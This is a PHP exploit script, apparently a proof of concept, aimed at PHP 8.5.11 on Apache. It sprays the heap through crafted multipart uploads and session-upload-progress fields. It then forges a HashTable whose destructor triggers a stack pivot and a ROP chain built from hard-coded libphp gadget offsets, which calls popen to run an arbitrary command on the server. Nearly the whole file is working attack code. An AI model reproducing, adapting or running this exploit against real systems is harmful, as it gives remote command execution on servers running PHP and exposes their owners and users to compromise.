<?php
declare(strict_types=1);
/* B2 variant: fake HashTable destructor = stack pivot + popen ROP chain.
 * Same A1/B1/A2 state as stage3_off.php; only the final payload differs.
 * Offsets are from php:8.5.11-apache libphp (verified):
 *   pivot   0x64904E  mov %rdi,%rsp; restore; jmp *0x40(%rsp)
 *   pop rdi 0x197128  pop %rdi; ret
 *   pop rsi 0x195A89  pop %rsi; ret
 *   ret     0x183016
 *   popen   0x18BBC0  popen@plt
 */
const BND_B = 'BBBBBBBBBB';
const BND_C = 'CCCCCCCCCC';
const PIVOT = 0x64904E;
const POP_RDI = 0x197128;
const POP_RSI = 0x195A89;
const RETG = 0x183016;
const POPEN = 0x18BBC0;

function p2s_part(string $bnd, string $name, string $value = '', ?string $filename = null, ?string $ctype = null): string {
    $s = '--' . $bnd . "\r\nContent-Disposition: form-data; name=\"$name\"";
    if ($filename !== null) { $s .= "; filename=\"$filename\""; }
    $s .= "\r\n";
    if ($ctype !== null) { $s .= "Content-Type: $ctype\r\n"; }
    return $s . "\r\n" . $value . "\r\n";
}
function p2s_send(int $port, string $body, string $bnd, int $readCap = 64 << 20, float $timeout = 180.0): string {
    $s = @stream_socket_client('tcp://127.0.0.1:' . $port, $errno, $errstr, 5.0);
    if (!$s) { throw new RuntimeException("connect: $errstr ($errno)"); }
    stream_set_timeout($s, (int) $timeout);
    $h = "POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:$port\r\n"
       . 'Content-Type: multipart/form-data; boundary=' . $bnd . "\r\n"
       . 'Content-Length: ' . strlen($body) . "\r\nConnection: close\r\n\r\n";
    fwrite($s, $h); $len = strlen($body);
    for ($o = 0; $o < $len; $o += 262144) { fwrite($s, substr($body, $o, 262144)); }
    $out = '';
    while (!feof($s) && strlen($out) < $readCap) {
        $r = fread($s, 65536); if ($r === false || $r === '') { break; } $out .= $r;
    }
    fclose($s); return $out;
}
function p2s_a2(): string {
    $out = p2s_part(BND_C, 'PHPSESSID', str_repeat('a', 32));
    $out .= p2s_part(BND_C, 'PHP_SESSION_UPLOAD_PROGRESS', 'k0');
    for ($i = 0; $i < 115; $i++) { $out .= p2s_part(BND_C, sprintf('%03d', $i), 'x'); }
    for ($i = 0; $i < 880; $i++) {
        $name = sprintf('files[R%05d]', $i) . str_repeat('[a]', 62);
        $out .= '--' . BND_C . "\r\nContent-Disposition: form-data; name=\"$name\"; filename=\"\""
              . "\r\nContent-Type: application/octet-stream\r\n\r\n";
    }
    return $out . '--' . BND_C . "--\r\n";
}
function p2s_fake_ref(int $ptr, int $rc): string {
    return pack('V', $rc) . pack('V', 0x0A) . pack('P', $ptr) . pack('V', 0x0107) . str_repeat("\0", 12);
}
function p2s_spray(int $vl, int $ptr, int $rc): string {
    $v = str_repeat('S', $vl);
    for ($o = 8; $o + 32 <= $vl; $o += 32) { $v = substr_replace($v, p2s_fake_ref($ptr, $rc), $o, 32); }
    return $v;
}
function p2s_mk_rop(int $S, int $lib, string $cmd, int $size = 384): string {
    $h = str_repeat("\0", $size);
    $w = function (int $off, string $bytes) use (&$h): void { $h = substr_replace($h, $bytes, $off, strlen($bytes)); };
    $pivot = $lib + PIVOT;
    $pop_rdi = $lib + POP_RDI;
    $pop_rsi = $lib + POP_RSI;
    $retg = $lib + RETG;
    $popen = $lib + POPEN;
    /* fake HashTable at S; arData = S+0x20; bucket 0 value is the pivot buffer */
    $w(0x00, pack('V', 1) . pack('V', 7));
    $w(0x08, pack('V', 0x10) . pack('V', 0xFFFFFFF8));
    $w(0x10, pack('P', $S + 0x20));
    $w(0x18, pack('V', 1) . pack('V', 1));
    $w(0x20, pack('V', 8) . pack('V', 0));
    $w(0x28, pack('P', 0));
    $w(0x30, pack('P', $pivot));
    /* bucket at S+0x20 = ht+0x20: pivot buffer / ROP stack */
    $w(0x20, pack('P', 0x0000037F00001F80)); /* MXCSR 0x1F80, fldcw 0x037F */
    $w(0x28, pack('P', 1));                  /* zval type byte: IS_NULL, not UNDEF */
    $w(0x30, pack('P', $pivot));              /* bucket+0x10 = HT->pDestructor (r12 unused) */
    for ($o = 0x38; $o <= 0x58; $o += 8) { $w($o, pack('P', 0)); } /* r13-r15, rbx, rbp */
    $w(0x60, pack('P', $pop_rdi));           /* bucket+0x40: jmp target */
    $w(0x68, pack('P', $S + 0x100));         /* bucket+0x48: CMD */
    $w(0x70, pack('P', $pop_rsi));           /* bucket+0x50 */
    $w(0x78, pack('P', $S + 0xF0));          /* bucket+0x58: "r" */
    $w(0x80, pack('P', $retg));              /* bucket+0x60: alignment */
    $w(0x88, pack('P', $popen));             /* bucket+0x68 */
    $w(0x90, pack('P', $retg));              /* popen return; then null -> crash */
    $w(0x98, pack('P', 0));
    $w(0xF0, "r\0");
    $w(0x100, $cmd . "\0");
    return $h;
}
function p2s_b2(int $n1, int $n2, int $vl, int $ptr1, int $rc1, int $ptr2, int $rc2, string $ht): string {
    $s1 = p2s_spray($vl, $ptr1, $rc1); $s2 = p2s_spray($vl, $ptr2, $rc2);
    $out = '';
    for ($i = 0; $i < $n1; $i++) { $out .= p2s_part(BND_B, substr(sprintf('s%09d', $i), 0, 10), $s1); }
    $out .= p2s_part(BND_B, 'ht', $ht);
    $out .= p2s_part(BND_B, 'PHPSESSID', str_repeat('a', 32));
    $out .= p2s_part(BND_B, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn');
    for ($i = 0; $i < $n2; $i++) { $out .= p2s_part(BND_B, substr(sprintf('t%09d', $i), 0, 10), $s2); }
    return $out . '--' . BND_B . "--\r\n";
}
$port = (int)($argv[1] ?? 8091);
$main = hexdec($argv[2] ?? '0');
$lib  = hexdec($argv[3] ?? '0');
$cmd  = $argv[4] ?? 'id>/tmp/rop_proof';
$S = $main + 0xF7398;
fprintf(STDERR, "A2\n");
$r = p2s_send($port, p2s_a2(), BND_C);
fprintf(STDERR, "  a2 resp=%d status=%s\n", strlen($r), strtok($r, "\r\n") ?: 'none');
usleep(200000);
$ht = p2s_mk_rop($S, $lib, $cmd);
fprintf(STDERR, "B2-ROP S=0x%x pivot=0x%x popen=0x%x\n", $S, $lib + PIVOT, $lib + POPEN);
$r = p2s_send($port, p2s_b2(500, 495, 384, $S, 1, 0, 1, $ht), BND_B);
fprintf(STDERR, "  b2 resp=%d status=%s\n", strlen($r), strtok($r, "\r\n") ?: 'none');
